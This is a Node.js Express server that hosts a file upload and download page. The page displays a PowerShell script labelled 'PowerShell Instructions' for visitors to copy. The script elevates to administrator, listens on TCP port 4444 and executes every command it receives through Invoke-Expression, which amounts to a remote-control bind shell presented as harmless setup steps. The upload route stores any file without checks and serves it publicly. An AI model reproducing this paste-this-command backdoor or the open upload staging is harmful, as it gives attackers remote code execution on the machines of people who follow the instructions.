const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const uploadDir = path.join(__dirname, 'uploads');

// יצירת תיקיית uploads אם לא קיימת
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + "-" + path.basename(file.originalname));
  }
});

const upload = multer({ storage });

let uploadedFile = null;

app.use('/files', express.static(uploadDir));

const psCommand = `Start-Process powershell -Verb runAs

$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
Write-Host "Waiting for connection on port 4444..."

$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()

$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$reader = New-Object System.IO.StreamReader($stream)

while($client.Connected) {
    $command = $reader.ReadLine()

    if($command) {
        Write-Host "Executing: $command"
        try {
            $result = Invoke-Expression $command 2>&1 | Out-String
            if ([string]::IsNullOrWhiteSpace($result)) { $result = "Command executed (No output)" }
            $writer.WriteLine($result)
        } catch {
            $writer.WriteLine("Error: $($_.Exception.Message)")
        }
        $writer.WriteLine("---END_OF_OUTPUT---")
    }
}`;

function renderPage() {

  let downloadLink = uploadedFile
    ? `<p><a href="/files/${uploadedFile.filename}" download>Download file</a></p>`
    : `<p>No file uploaded yet</p>`;

  return `
<!doctype html>
<html>
<head>
<meta charset="UTF-8">
<title>Server</title>

<style>
body{
  font-family: Arial;
  padding:40px;
  background:#f5f5f5;
}

.code-box{
  background:#1e1e1e;
  color:#d4d4d4;
  padding:20px;
  border-radius:10px;
  font-family:Consolas,monospace;
  font-size:14px;
  line-height:1.5;
  overflow-x:auto;
  box-shadow:0 8px 20px rgba(0,0,0,0.25);
  border:1px solid #333;
  max-width:900px;
  margin-bottom:30px;
}

.code-box pre{
  margin:0;
  white-space:pre-wrap;
}

button{
  padding:8px 16px;
  cursor:pointer;
}
</style>

</head>

<body>

<div class="code-box">
<h2>PowerShell Instructions</h2>
<pre>${psCommand}</pre>
</div>

<h2>Upload file</h2>

<form action="/upload" method="post" enctype="multipart/form-data">
<input type="file" name="file"/>
<button type="submit">Upload</button>
</form>

${downloadLink}

</body>
</html>
`;
}

app.get('/', (req, res) => {
  res.send(renderPage());
});

app.post('/upload', upload.single('file'), (req, res) => {
  uploadedFile = req.file;
  res.redirect('/');
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
